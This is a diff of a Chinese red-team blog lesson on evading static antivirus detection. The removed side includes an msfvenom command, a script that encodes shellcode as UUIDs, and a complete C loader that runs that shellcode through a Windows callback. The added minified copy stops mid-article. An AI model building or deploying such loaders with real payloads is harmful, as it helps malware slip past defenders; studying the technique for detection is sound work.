@@ -1,377 +1,146 @@
-<!DOCTYPE html>
-<html lang=""><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>静态恶意代码逃逸（第十课） « 倾旋的博客</title>
-    <meta name="description" content="倾旋的博客">
-    <meta name="author" content='倾旋'>
-
-    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">
-
-    
-    <link rel="stylesheet" href="/sass/researcher.min.css">
-    
-    
-        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
-    
-
-    
-        
-    
-</head>
-
-    <body>
-<input type="checkbox" id="menu-toggle" class="menu-toggle">
-<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
-<nav class="main-nav">
-    
-    <ul>
-    
-        
-        
-            <li><a href="/projects/">Projects</a></li>
-        
-            <li><a href="/links/">Links</a></li>
-        
-            <li><a href="/post/">Posts</a></li>
-        
-            <li><a href="/index.xml">Rss</a></li>
-        
-            <li><a href="/tools/">Tools</a></li>
-        
-    
-    </ul>
-   
-</nav>
-<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
-<div class="container">
-    <h1>静态恶意代码逃逸（第十课）</h1>
-    <p>本节课，使用UUID的方式存储Shellcode，再介绍一些CALL BACK函数的特性来加载Shellcode。</p>
-        <div class = "toc-wrapper">
-            
-<div class="post-toc" id="post-toc">
-<aside>
-    
-    
-    
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x01-uuid">0x01 UUID</a></li>
-    <li><a href="#0x02-与uuid相关的windows-api">0x02 与UUID相关的Windows API</a></li>
-    <li><a href="#0x03-uuid-测试">0x03 UUID 测试</a>
-      <ul>
-        <li><a href="#生成shellcode">生成Shellcode</a></li>
-        <li><a href="#bin2uuid">Bin2UUID</a></li>
-        <li><a href="#生成测试样本">生成测试样本</a></li>
-      </ul>
-    </li>
-    <li><a href="#0x04-windows-call-back函数">0x04 Windows CALL BACK函数</a></li>
-    <li><a href="#参考">参考</a></li>
-  </ul>
-</nav>
-    
-    
-</aside>
-<a href="#" id="toc-toggle"></a>
-</div>
-
-
-
-        </div>
-    <p>代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
-<h2 id="0x01-uuid">0x01 UUID</h2>
-<p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：<a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">维基百科</a></p>
-<p>关于Windows中的GUID也等同于UUID，先看一下结构：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_GUID</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>  Data1; <span style="color:#75715e">// 4字节
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> Data2; <span style="color:#75715e">// 2字节
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> Data3; <span style="color:#75715e">// 2字节
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  Data4[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// 8字节
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} GUID;
-</span></span></code></pre></div><p>总和一共16字节，16*8 = 128位。</p>
-<h2 id="0x02-与uuid相关的windows-api">0x02 与UUID相关的Windows API</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>RPC_STATUS <span style="color:#a6e22e">UuidFromString</span>(
-</span></span><span style="display:flex;"><span>  RPC_CSTR StringUuid,
-</span></span><span style="display:flex;"><span>  UUID     <span style="color:#f92672">*</span>Uuid
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>功能：将字符串UUID转换为UUID结构。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>RPC_STATUS <span style="color:#a6e22e">UuidCreate</span>(
-</span></span><span style="display:flex;"><span>  UUID <span style="color:#f92672">*</span>Uuid
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>功能：创建UUID结构。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">UuidEqual</span>(
-</span></span><span style="display:flex;"><span>  UUID       <span style="color:#f92672">*</span>Uuid1,
-</span></span><span style="display:flex;"><span>  UUID       <span style="color:#f92672">*</span>Uuid2,
-</span></span><span style="display:flex;"><span>  RPC_STATUS <span style="color:#f92672">*</span>Status
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>功能：判断两个UUID是否相等。</p>
-<p>通过URL查看：https://docs.microsoft.com/en-us/windows/win32/rpc/rpcdce/ns-rpcdce-uuid</p>
-<p>UUID 代表了 -&gt; <code>typedef GUID UUID;</code></p>
-<h2 id="0x03-uuid-测试">0x03 UUID 测试</h2>
-<h3 id="生成shellcode">生成Shellcode</h3>
-<pre tabindex="0"><code>./msfvenom -p windows/exec CMD=calc.exe -b &#39;\xfc\xe8&#39; -f raw -o /tmp/shellcode.bin
-</code></pre><h3 id="bin2uuid">Bin2UUID</h3>
-<p>生成脚本：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> uuid <span style="color:#f92672">import</span> UUID
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ____  _    _______    _    _ _    _ _____ _____       
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  _ &lt;| | &#39;_ \| |/ _ \| |  | | |  | | | | | |  | / __| 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>    bin <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;--print&#34;</span>:
-</span></span><span style="display:flex;"><span>    outputMapping <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    outputMapping <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Length of shellcode: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(len(bin)))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(offset <span style="color:#f92672">&lt;</span> len(bin)):
-</span></span><span style="display:flex;"><span>    countOfBytesToConvert <span style="color:#f92672">=</span> len(bin[offset:])
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> countOfBytesToConvert <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>:
-</span></span><span style="display:flex;"><span>        ZerosToAdd <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> countOfBytesToConvert
-</span></span><span style="display:flex;"><span>        byteString <span style="color:#f92672">=</span> bin[offset:] <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span> ZerosToAdd)
-</span></span><span style="display:flex;"><span>        uuid <span style="color:#f92672">=</span> UUID(bytes_le<span style="color:#f92672">=</span>byteString)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        byteString <span style="color:#f92672">=</span> bin[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>]
-</span></span><span style="display:flex;"><span>        uuid <span style="color:#f92672">=</span> UUID(bytes_le<span style="color:#f92672">=</span>byteString)
-</span></span><span style="display:flex;"><span>    offset<span style="color:#f92672">+=</span><span style="color:#ae81ff">16</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(uuid)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> outputMapping:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> -&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(byteString, uuid))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;UUIDs&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(out)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Outputted to: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;UUIDs&#34;</span>))
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae1d7ed2-4f5f-11ec-be52-00d861bf4abb.png" alt="2021-02-08-20-41-08"  />
-  </p></p>
-<h3 id="生成测试样本">生成测试样本</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;rpc.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;Rpcrt4.lib&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf[] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;4baf01bd-dbdd-d9de-7424-f45a33c9b131&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;83136a31-04c2-6a03-0e4d-be21f81341da&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;3fcb73f8-b3c9-34af-7904-bb1975efe989&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;bd259d0e-28a7-f010-3800-6093ba5bb573&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;72c89383-cec4-2621-9d85-94d7aad02453&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;802cf5e0-f4b0-171d-cbae-bd9918dbf781&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;394ee67d-9cb5-eb50-845d-fed229acfe13&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;3327227b-f020-6246-8c57-76746f07d2fe&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;bad08a62-64c7-e79b-61ed-4272307075a8&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;59f68d76-6a06-2be6-0336-a0c0792745e7&#34;</span>,
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;844c482e-dab1-650c-545b-b67900000000&#34;</span>
-</span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> dwNum <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buf) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(buf[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	HANDLE hMemory <span style="color:#f92672">=</span> HeapCreate(HEAP_CREATE_ENABLE_EXECUTE <span style="color:#f92672">|</span> HEAP_ZERO_MEMORY, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hMemory <span style="color:#f92672">==</span> NULL) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	PVOID pMemory <span style="color:#f92672">=</span> HeapAlloc(hMemory, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1024</span>);
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	DWORD_PTR CodePtr <span style="color:#f92672">=</span> (DWORD_PTR)pMemory;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwNum; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (CodePtr <span style="color:#f92672">==</span> NULL) {
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		RPC_STATUS	status <span style="color:#f92672">=</span> UuidFromStringA(RPC_CSTR(buf[i]), (UUID<span style="color:#f92672">*</span>)CodePtr);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> RPC_S_OK) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		CodePtr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">16</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pMemory <span style="color:#f92672">==</span> NULL) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL) <span style="color:#f92672">==</span> FALSE) {
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 加载成功
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae5cbe3a-4f5f-11ec-b376-00d861bf4abb.png" alt="2021-02-08-20-52-53"  />
-  </p></p>
-<h2 id="0x04-windows-call-back函数">0x04 Windows CALL BACK函数</h2>
-<p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p>
-<p>通过MSDN直接搜索Callback/Proc关键字就能发现一些回调函数：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae914808-4f5f-11ec-bce4-00d861bf4abb.png" alt="2021-02-08-20-59-11"  />
-  </p></p>
-<p>例如：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>HINTERNET hOpen;                       <span style="color:#75715e">// Root HINTERNET handle
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>INTERNET_STATUS_CALLBACK iscCallback;  <span style="color:#75715e">// Holds the callback function
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Create the root HINTERNET handle.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>hOpen <span style="color:#f92672">=</span> InternetOpen( TEXT(<span style="color:#e6db74">&#34;Test Application&#34;</span>),
-</span></span><span style="display:flex;"><span>                      INTERNET_OPEN_TYPE_PRECONFIG,
-</span></span><span style="display:flex;"><span>                      NULL, NULL, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Set the status callback function.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>iscCallback <span style="color:#f92672">=</span> InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> CALLBACK <span style="color:#a6e22e">CallMaster</span>( HINTERNET,
-</span></span><span style="display:flex;"><span>    DWORD_PTR,
-</span></span><span style="display:flex;"><span>    DWORD,
-</span></span><span style="display:flex;"><span>    LPVOID,
-</span></span><span style="display:flex;"><span>    DWORD
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p>
-<p>这篇文章中介绍了如何发现其他带有回调的<a href="http://ropgadget.com/posts/abusing_win_functions.html">Windows API</a>。</p>
-<h2 id="参考">参考</h2>
-<ul>
-<li><a href="http://www.cn0sec.cn/index.php/archives/337/">http://www.cn0sec.cn/index.php/archives/337/</a></li>
-<li><a href="http://ropgadget.com/posts/abusing_win_functions.html">http://ropgadget.com/posts/abusing_win_functions.html</a></li>
-</ul>
-
-</div>
-<div class="container">
-    <script src="https://giscus.app/client.js"
-    data-repo="Rvn0xsy/rvn0xsy.github.io"
-    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
-    data-category="General"
-    data-category-id="DIC_kwDOF-pTTM4CRDk_"
-    data-mapping="title"
-    data-strict="0"
-    data-reactions-enabled="1"
-    data-emit-metadata="0"
-    data-input-position="bottom"
-    data-theme="dark_tritanopia"
-    data-lang="zh-CN"
-    data-loading="lazy"
-    crossorigin="anonymous"
-    async>
-  </script>
-</div>
-<div class="container">
-    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-    <div class="bio__blurb">
-        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
-        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
-    </div>
-<div class="bio__avatar">
-    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
-</div></section>
-</div>
-
-        </div>
-<footer class="site-footer">
-    <div class="container">
-        <div class="site-footer__col">
-        <h5>Get in touch</h5>
-        <p>
-            If you like my project or have some questions,feel free
-            to contact me</a>.
-        </p>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Me Elsewhere</h5>
-        <ul>
-        
-                <li>
-                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
-                    
-                </li>
-        
-        </ul>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Meta Links</h5>
-        <ul>
-            
-                
-                
-                    <li class="">
-                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
-                    </li>
-                
-            
-        </ul>
-        </div>
-        <p class="site-footer__copyright">
-        © 倾旋 2021. All rights reserved.
-        </p>
-    </div>
-    </footer>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
-<script>
-(function(){
-  let plantumlPrefix = "language-plantuml";
-  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
-    let image = document.createElement("IMG");
-    image.loading = 'lazy'; 
-    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
-    code.parentNode.insertBefore(image, code);
-    code.style.display = 'none';
-  });
-})();
-</script>
-
-</body>
-</html>
+<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第十课） « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
+<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>静态恶意代码逃逸（第十课）</h1><p>本节课，使用UUID的方式存储Shellcode，再介绍一些CALL BACK函数的特性来加载Shellcode。</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x01-uuid>0x01 UUID</a></li><li><a href=#0x02-与uuid相关的windows-api>0x02 与UUID相关的Windows API</a></li><li><a href=#0x03-uuid-测试>0x03 UUID 测试</a><ul><li><a href=#生成shellcode>生成Shellcode</a></li><li><a href=#bin2uuid>Bin2UUID</a></li><li><a href=#生成测试样本>生成测试样本</a></li></ul></li><li><a href=#0x04-windows-call-back函数>0x04 Windows CALL BACK函数</a></li><li><a href=#参考>参考</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x01-uuid>0x01 UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：<a href=https://en.wikipedia.org/wiki/Universally_unique_identifier>维基百科</a></p><p>关于Windows中的GUID也等同于UUID，先看一下结构：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>_GUID</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>  Data1; <span style=color:#75715e>// 4字节
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> Data2; <span style=color:#75715e>// 2字节
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> Data3; <span style=color:#75715e>// 2字节
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>  Data4[<span style=color:#ae81ff>8</span>]; <span style=color:#75715e>// 8字节
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} GUID;
+</span></span></code></pre></div><p>总和一共16字节，16*8 = 128位。</p><h2 id=0x02-与uuid相关的windows-api>0x02 与UUID相关的Windows API</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>RPC_STATUS <span style=color:#a6e22e>UuidFromString</span>(
+</span></span><span style=display:flex><span>  RPC_CSTR StringUuid,
+</span></span><span style=display:flex><span>  UUID     <span style=color:#f92672>*</span>Uuid
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>功能：将字符串UUID转换为UUID结构。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>RPC_STATUS <span style=color:#a6e22e>UuidCreate</span>(
